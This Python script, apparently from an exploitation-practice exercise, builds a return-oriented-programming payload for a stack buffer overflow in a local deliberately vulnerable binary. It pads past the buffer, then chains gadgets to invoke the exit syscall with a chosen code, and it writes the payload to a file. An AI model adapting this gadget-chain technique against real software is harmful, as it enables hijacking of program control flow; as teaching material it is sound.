import pathlib
from exploitsCommon import *


# In order to run this exploit:
# - Run in a terminal:
#     - mkfifo ./bin/mypipe
#     - cat ./bin/mypipe | ./bin/vulnerable64bit.exe ; echo Return code is $?
# - Run in another terminal:
#     - python3 ./exploits/payloadSyscallExit64.py && cat ./exploits/payloadSyscallExit64.dat > ./bin/mypipe
# - Go back to the first terminal and wait a few seconds.


if __name__ == "__main__":
    changeCWDToScriptDirectory()

    print('Scanning bytes...')
    instrSequences = getInstructionSequenceOutput('vulnerable64bit.exe')

    payloadComponents = [
        b'\xFF' * 100, # Add padding to get over the stack buffer.
        b'\xFF' * 12, # Add padding to get over ??.
        b'\xFF' * 8, # Add padding to get over the stored RBP value.

        # RDI = returnCode;
        findInstructionSequenceAddress(instrSequences, 'pop rdi; ret'),
        (109).to_bytes(8, 'little'),

        # RAX = 60; (system call number for `exit();`)
        findInstructionSequenceAddress(instrSequences, 'pop rax; ret'),
        (60).to_bytes(8, 'little'),

        # call `exit(RDI);`
        findInstructionSequenceAddress(instrSequences, 'syscall; ret'),

        # Add more padding to make sure we go over the hardcoded stack buffer length.
        b'\xFF' * 100,
    ]

    payload = b''.join(payloadComponents)
    print(f"payload = {payload.hex()}")

    scriptFileNameWithoutExtension = pathlib.Path(__file__).stem
    with open(f'{scriptFileNameWithoutExtension}.dat', 'wb') as fout:
        fout.write(payload)
